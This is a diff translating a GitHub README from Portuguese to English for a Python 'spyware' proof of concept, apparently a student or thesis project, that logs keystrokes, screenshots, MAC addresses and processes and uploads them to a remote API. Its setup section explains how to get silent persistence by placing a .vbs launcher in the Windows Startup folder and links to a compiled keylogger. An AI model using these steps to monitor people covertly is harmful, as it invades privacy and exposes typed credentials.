@@ -1,35 +1,35 @@
 # spyware
 
-## Desenvolvimento:
-* Foi usado Python 3.8 como linguagem base;
-* Foram usado bibliotecas auxiliares para extração dos dados (Keyboard, getmac, psutil, base64, io, pyscreenshot e IPy);
-* Para salvar os dados foi usado uma API, desenvolvida por mim e hospedada na Heroku;
-* Para o envio dos dados foi usada a bilioteca requests e para a serialização foi usada a biblioteca json;
-* Foi integrada com o ChatGPT para ajudar na detecção de discurso de ódio, além dos meus modelos de predição desenvolvido.
+## Development:
+* Python 3.8 was used as the base language;
+* Auxiliary libraries were used for data extraction (Keyboard, getmac, psutil, base64, io, pyscreenshot, and IPy);
+* An API, developed by me and hosted on Heroku, was used to save the data;
+* The requests library was used for data transmission and the json library for serialization;
+* Integrated with ChatGPT to assist in detecting hate speech, in addition to my developed prediction models.
 
-## Projeto:
-* Projeto de Prova de conceito para o desenvolvimento de malware's para que assim possamos aprender como evitá-los e reconhece-los;
-* Este spyware faz parte de um projeto maior chamado Remote-Analyser, o qual é um sistema desenvolvido por mim, para coleta de dados suspeitos em computadores empresarias e/ou institucionais. Servindo assim, como um monitoramento mais eficiente do patrimônio destas entidades;
-* Esse script que coleta os dados foi desenvolvido em Python usando diversas bibliotecas específicas para auxiliar no desenvolvimento. Esse script fica ativo e vai gerar um Alerta toda vez que algo suspeito seja digitado, se algum processo malicioso esteja rodando ou se tem alguma porta aberta com alguma aplicação suspeita, enviando os dados para a API Gateway. Os dados coletados são: o endereço MAC do PC, a frase digitada que gerou o Alerta, os processos ativos no sistema e um PrintScreen da tela do usuário. Após isso, o script faz login na API Gateway e usa o token gerado para salvar os dados na API.
-* O script também tem integração com um modelo criado para detectar discurso de ódio, desenvolvido por mim, além de um Sniffer e um Scanner, para evitar sites indesejados e vulnerabilidades;
-*  Recentemente foi feita uma integração com o ChatGPT para auxiliar na análise de discurso de ódio.
+## Project:
+* Proof of concept project for the development of malware so that we can learn how to avoid and recognize them;
+* This spyware is part of a larger project called Remote-Analyser, which is a system developed by me, for collecting suspicious data on corporate and/or institutional computers. Thus, serving as a more efficient monitoring of these entities' assets;
+* This script that collects data was developed in Python using various specific libraries to assist in development. This script remains active and will generate an Alert whenever something suspicious is typed, if any malicious process is running, or if there is any open port with a suspicious application, sending the data to the API Gateway. The collected data includes: the PC's MAC address, the typed phrase that triggered the Alert, the active processes in the system, and a PrintScreen of the user's screen. After that, the script logs into the API Gateway and uses the generated token to save the data in the API.
+* The script also integrates with a model I created to detect hate speech, in addition to a Sniffer and a Scanner, to avoid unwanted sites and vulnerabilities;
+* Recently, an integration with ChatGPT was made to assist in hate speech analysis.
 
-## Como utilizar:
-* Primeiramente é preciso baixar o projeto e rodar o comando:
+## How to use:
+* First, you need to download the project and run the command:
 ```
 python setup.py build
 ```
-* Este comando vai compilar o projeto, gerando um projeto com um .exe (Ou apenas baixe o projeto compilado <a href="https://github.com/DarlanNoetzold/spyware/raw/main/spyware/keyLogger.rar">aqui</a>);
-* Copie a pasta com o .exe e cole em um diretório chamado keyLogger;
-* Esta pasta deve ser colocada no diretório raiz do seu SO;
-* Após isso basta ir para o diretório C:\Users\\<Seu Usuário>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup;
-* E colar o arquivo <a href="https://github.com/DarlanNoetzold/spyware/blob/main/spyware/script_background.vbs"> .vbs </a>;
-* Agora, o script será executado toda vez que o windows iniciar, sem precisar ter as biblioteas usadas, nem o Python.
+* This command will compile the project, generating a project with a .exe file (Or just download the compiled project [here](https://github.com/DarlanNoetzold/spyware/raw/main/spyware/keyLogger.rar));
+* Copy the folder with the .exe and paste it into a directory called keyLogger;
+* This folder should be placed in the root directory of your OS;
+* After that, just go to the directory `C:\Users\<Your User>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`;
+* And paste the [.vbs file](https://github.com/DarlanNoetzold/spyware/blob/main/spyware/script_background.vbs);
+* Now, the script will be executed every time Windows starts, without needing the used libraries, nor Python.
 
-### OU
+### OR
 
-* A aplicação completa contendo todos os microserviços configurados pode ser obtida no [DockerHub](https://hub.docker.com/repository/docker/darlannoetzold/tcc-spyware/general).
-* Para executá-lo de maneira mais fácil basta excutar os seguintes comandos:
+* The complete application containing all configured microservices can be obtained at [DockerHub](https://hub.docker.com/repository/docker/darlannoetzold/tcc-spyware/general).
+* To run it more easily, just execute the following commands:
 ```
 docker container run --platform=linux/amd64 -it -p 8091:8091 -p 8090:8090 -p 5000:5000 -p 9091:9090 -p 3000:3000 --name=app -d darlannoetzold/tcc-spyware:4.0
 docker exec -itd app /init-spyware-api.sh
@@ -39,18 +39,19 @@ docker exec -itd app /init-handler-hatespeech.sh
 
 ---
 ## API:
-* Repositório no GitHub:
-<br>Link: https://github.com/DarlanNoetzold/spyware-API
+* GitHub Repository:
+<br>Link: [https://github.com/DarlanNoetzold/spyware-API](https://github.com/DarlanNoetzold/spyware-API)
 
 ---
-## API do HateSpeech:
-* Repositório no GitHub:
-<br>Link: https://github.com/DarlanNoetzold/HateSpeech-portuguese
+## HateSpeech API:
+* GitHub Repository:
+<br>Link: [https://github.com/DarlanNoetzold/HateSpeech-portuguese](https://github.com/DarlanNoetzold/HateSpeech-portuguese)
 
 ---
 ## Remote-Analyser
-* Repositório no GitHub:
-<br>Link: https://github.com/DarlanNoetzold/Remote-Analyser
+* GitHub Repository:
+<br>Link: [https://github.com/DarlanNoetzold/Remote-Analyser](https://github.com/DarlanNoetzold/Remote-Analyser)
 
 ---
 ⭐️ From [DarlanNoetzold](https://github.com/DarlanNoetzold)
+
